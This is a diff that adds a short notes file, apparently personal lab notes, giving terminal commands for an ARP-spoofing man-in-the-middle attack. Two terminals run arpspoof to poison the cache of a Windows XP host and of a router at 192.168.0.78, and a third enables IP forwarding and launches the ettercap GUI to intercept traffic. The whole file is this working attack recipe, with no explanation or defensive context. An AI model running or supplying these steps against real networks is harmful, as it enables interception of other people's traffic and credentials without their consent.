@@ -1,0 +1,12 @@
+first terminal:
+arpspoof -i eth0 -t xp-ip router-ip(192.168.0.78)
+
+---------------------------------------------
+second terminal:
+arpspoof -i eth0 -t router-ip(192.168.0.78) xp-ip
+
+-------------------------------
+Third terminal:
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+ettercap -G
